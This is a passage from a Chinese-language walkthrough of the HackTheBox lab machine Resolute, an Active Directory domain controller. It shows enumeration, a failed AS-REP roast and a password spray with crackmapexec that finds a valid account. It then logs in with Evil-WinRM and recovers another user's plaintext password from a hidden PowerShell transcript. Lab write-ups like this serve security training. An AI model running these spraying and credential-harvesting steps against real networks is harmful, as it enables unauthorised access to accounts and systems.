DIGEST-MD5</span><br><span class="line">|       dnsHostName: Resolute.megabank.local</span><br><span class="line">|       ldapServiceName: megabank.local:resolute$@MEGABANK.LOCAL</span><br><span class="line">|       serverName: CN=RESOLUTE,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=megabank,DC=local</span><br><span class="line">......</span><br><span class="line">|       isSynchronized: TRUE</span><br><span class="line">|       isGlobalCatalogReady: TRUE</span><br><span class="line">|       domainFunctionality: 7</span><br><span class="line">|       forestFunctionality: 7</span><br><span class="line">|_      domainControllerFunctionality: 7</span><br><span class="line">Service Info: Host: RESOLUTE; OS: Windows</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds</span><br></pre></td></tr></table></figure>

<p>它似乎是有一个子域：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resolute$@MEGABANK.LOCAL</span><br></pre></td></tr></table></figure>

<h5 id="SMB端口："><a href="#SMB端口：" class="headerlink" title="SMB端口："></a>SMB端口：</h5><p>遗憾的是，目标不允许匿名访问共享：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -N -L \\10.10.10.169</span><br><span class="line">Anonymous login successful</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.10.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>

<p>或许我可以试试通过RPC得到的口令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.10.169 -u marco -p &#x27;Welcome123!&#x27; --continue-on-success</span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marco:Welcome123! STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>它也不可以。其他端口我觉得我没必要写，因为它没什么内容，尤其是两个http服务端口，都是not found。即使强行爆破一下，也是什么都没有的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://10.10.10.169:5985/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                     </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                              </span><br><span class="line">                                                                                                                                     </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/worldisend/.dirsearch/reports/10.10.10.169-5985/-_22-04-23_17-51-44.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/worldisend/.dirsearch/logs/errors-22-04-23_17-51-44.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.169:5985/</span><br><span class="line"></span><br><span class="line">[17:51:45] Starting: </span><br><span class="line">[17:51:51] 403 -  312B  - /%2e%2e//google.com                              </span><br><span class="line">[17:52:25] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           </span><br><span class="line">[17:54:23] 405 -    0B  - /wsman                                            </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed  </span><br></pre></td></tr></table></figure>

<h5 id="kerberos端口："><a href="#kerberos端口：" class="headerlink" title="kerberos端口："></a>kerberos端口：</h5><p>我可以将从RPC枚举到的用户名提取做成一本字典，这里不需要枚举了，因为RPC本身就是从目标机器中查询出来的用户，这些用户本就是存在的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DefaultAccount</span><br><span class="line">ryan</span><br><span class="line">marko</span><br><span class="line">sunita</span><br><span class="line">abigail</span><br><span class="line">marcus</span><br><span class="line">sally</span><br><span class="line">fred</span><br><span class="line">angela</span><br><span class="line">felicia</span><br><span class="line">gustavo</span><br><span class="line">ulf</span><br><span class="line">stevie</span><br><span class="line">claire</span><br><span class="line">paulo</span><br><span class="line">steve</span><br><span class="line">annette</span><br><span class="line">annika</span><br><span class="line">per</span><br><span class="line">claude</span><br><span class="line">melanie</span><br><span class="line">zach</span><br><span class="line">simon</span><br><span class="line">naoki</span><br></pre></td></tr></table></figure>

<p>我试着去枚举目标中保存有AS-REP的哈希：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ../toolbox/impacket-0.9.24/examples/GetNPUsers.py &#x27;MEGABANK.LOCAL/&#x27; -usersfile ./users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.169</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class="line">[-] User ryan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User marko doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User sunita doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User abigail doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User marcus doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User sally doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User fred doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User angela doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User felicia doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User gustavo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User ulf doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User stevie doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User claire doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User paulo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User steve doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User annette doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User annika doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User per doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User claude doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User melanie doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User zach doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User simon doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class="line">[-] User naoki doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br></pre></td></tr></table></figure>

<p>但是我失败了，一条哈希都没有。没想到这次我竟然这么快就进入了死胡同，因为我现在只有一堆用户名和一个口令。</p>
<h5 id="密码喷涂："><a href="#密码喷涂：" class="headerlink" title="密码喷涂："></a>密码喷涂：</h5><p>还是我局限了在目标机器中有个标签”<strong>Password Spraying</strong>“，即密码喷涂的意思，它类似于暴力破解，但不同的是，密码喷涂是拥有口令之后，对不同的用户名进行枚举猜解，从而获取完整的合法账户凭证，我可以借助SMB共享来间接的确定这一点，信息也有很多，我会截出关键的，因为它实在太明显了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.10.169 -u ./users.txt -p &#x27;Welcome123!&#x27; --continue-on-success</span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)</span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Administrator:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\zach:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\simon:Welcome123! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\naoki:Welcome123! STATUS_LOGON_FAILURE </span><br></pre></td></tr></table></figure>

<p>倒数第四条信息，看起来我获取的口令是与melanie匹配的。</p>
<h5 id="以melanie身份登录目标并获取user-txt："><a href="#以melanie身份登录目标并获取user-txt：" class="headerlink" title="以melanie身份登录目标并获取user.txt："></a>以melanie身份登录目标并获取user.txt：</h5><p>我可以试着去登录目标：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.10.169 -u melanie -p &#x27;Welcome123!&#x27;</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; </span><br></pre></td></tr></table></figure>

<p>我成功了，并且我获取到了user.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; cd ../desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\desktop&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\melanie\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        4/23/2022   2:16 AM             34 user.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\desktop&gt; type user.txt</span><br></pre></td></tr></table></figure>

<h5 id="域侦察："><a href="#域侦察：" class="headerlink" title="域侦察："></a>域侦察：</h5><p>当前用户没什么权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\melanie\desktop&gt; whoami /pirv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\desktop&gt; </span><br></pre></td></tr></table></figure>

<p>我可以看一眼详细信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\melanie&gt; net user melanie</span><br><span class="line">User name                    melanie</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User&#x27;s comment</span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            4/23/2022 4:53:03 AM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          4/24/2022 4:53:03 AM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Remote Management Use</span><br><span class="line">Global Group memberships     *Domain Users</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie&gt; </span><br></pre></td></tr></table></figure>

<p>没什么信息，我可以看一眼它的组信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\melanie&gt; whoami /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID          Attributes</span><br><span class="line">========================================== ================ ============ ==================================================</span><br><span class="line">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie&gt; </span><br></pre></td></tr></table></figure>

<p>没什么有用的，用户目录也没有什么有用的信息，在Users目录中会有一个ryan目录，该用户我觉得需要留意一下，最起码相比其他用户，这个用户是切切实实被用来登录过目标机器的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        9/25/2019  10:43 AM                Administrator</span><br><span class="line">d-----        12/4/2019   2:46 AM                melanie</span><br><span class="line">d-r---       11/20/2016   6:39 PM                Public</span><br><span class="line">d-----        9/27/2019   7:05 AM                ryan</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在根中，我发现了一些隐藏目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----        9/25/2019   6:19 AM                PerfLogs</span><br><span class="line">d-r---        9/25/2019  12:39 PM                Program Files</span><br><span class="line">d-----       11/20/2016   6:36 PM                Program Files (x86)</span><br><span class="line">d-r---        12/4/2019   2:46 AM                Users</span><br><span class="line">d-----        12/4/2019   5:15 AM                Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; ls -force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d--hs-        12/3/2019   6:40 AM                $RECYCLE.BIN</span><br><span class="line">d--hsl        9/25/2019  10:17 AM                Documents and Settings</span><br><span class="line">d-----        9/25/2019   6:19 AM                PerfLogs</span><br><span class="line">d-r---        9/25/2019  12:39 PM                Program Files</span><br><span class="line">d-----       11/20/2016   6:36 PM                Program Files (x86)</span><br><span class="line">d--h--        9/25/2019  10:48 AM                ProgramData</span><br><span class="line">d--h--        12/3/2019   6:32 AM                PSTranscripts</span><br><span class="line">d--hs-        9/25/2019  10:17 AM                Recovery</span><br><span class="line">d--hs-        9/25/2019   6:25 AM                System Volume Information</span><br><span class="line">d-r---        12/4/2019   2:46 AM                Users</span><br><span class="line">d-----        12/4/2019   5:15 AM                Windows</span><br><span class="line">-arhs-       11/20/2016   5:59 PM         389408 bootmgr</span><br><span class="line">-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT</span><br><span class="line">-a-hs-        4/23/2022   2:15 AM      402653184 pagefile.sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; </span><br></pre></td></tr></table></figure>

<p>PSTranscripts可不像是一个计算机本该有的目录，在它下边确实会有一个隐藏目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; cd PSTranscripts</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; ls</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; ls -force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d--h--        12/3/2019   6:45 AM                20191203</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; </span><br></pre></td></tr></table></figure>

<p>在隐藏目录中还会有一个隐藏文本文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; cd 20191203</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; dir</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; ls -force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts\20191203</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span><br></pre></td></tr></table></figure>

<p>我可以试着去看一眼，我删除了一些不必要的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: 20191203063201</span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">......</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span><br><span class="line">......</span><br><span class="line">**********************</span><br><span class="line">**********************</span><br><span class="line">......</span><br><span class="line">PS&gt;CommandInvocation(Invoke-Expression): &quot;Invoke-Expression&quot;</span><br><span class="line">&gt;&gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">cmd : The syntax of this command is:</span><br><span class="line">At line:1 char:1</span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">......</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt;</span><br></pre></td></tr></table></figure>

<p>文本里边多次提到一个看起来像是一串密码的字符串”<strong>Serv3r4Admin4cc123!</strong>“,还有用户”<strong>ryan</strong>“。</p>
<h5 id="以ryan身份登录："><a href="#以ryan身份登录：" class="headerlink" title="以ryan身份登录："></a>以ryan身份登录：</h5><p>我可以试着用ryan登录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.10.169 -u ryan -p Serv3r4Admin4cc123!                      </span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; </span><br></pre></td></tr></table></figure>

<p>在ryan桌面有个笔记，里边记载了一些信息：</p>
